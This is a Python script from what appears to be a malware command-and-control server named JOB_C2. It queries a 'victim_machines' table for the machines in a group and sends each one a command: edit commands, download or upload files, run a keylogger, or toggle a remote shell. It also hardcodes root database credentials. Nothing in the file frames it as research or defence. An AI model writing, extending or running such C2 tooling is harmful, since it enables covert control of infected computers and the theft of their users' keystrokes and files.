#!/usr/bin/env python
import io
import re
import base64
import sys
import json
import time
import mysql.connector
from mysql.connector import MySQLConnection, Error
from addcommand import editcommand
from downloadfile import downloadfile
from uploadfile import uploadfile
from keylogger import keylogger
from toggleshell import toggleshell

def groupcommands( command_id, group_id, *argv ):

	#query to select the specific machines that are in the given group
	query = """ SELECT victim_id FROM victim_machines WHERE group_id = %s """
	data = (group_id,)

	try:

		connection = MySQLConnection(host='localhost',database='JOB_C2',user='root',password='newpassword',auth_plugin='mysql_native_password')
		if connection.is_connected():
			print('Connected to JOB_C2 database')

		cursor = connection.cursor(buffered=True)
		cursor.execute(query,data)
		result = cursor.fetchall()

		if result:
			#call the appropriate function for each machine found in the group
			if int(command_id) == 1:
				for machine in result:
					editcommand(machine[0], argv[0])
			elif int(command_id) == 2:
				for machine in result:
					downloadfile(machine[0], argv[0], argv[1])
			elif int(command_id) == 3:
				for machine in result:
					uploadfile(machine[0], argv[0], argv[1])
			elif int(command_id) == 4:
				for machine in result:
					keylogger(machine[0], argv[0])
			elif int(command_id) == 5:
				for machine in result:
					toggleshell(machine[0], argv[0], argv[1])

	except Error as error:
		print(error)

	finally:
		cursor.close()
		connection.close()

	return True

if __name__ == "__main__":
	groupcommands(*sys.argv[1:])
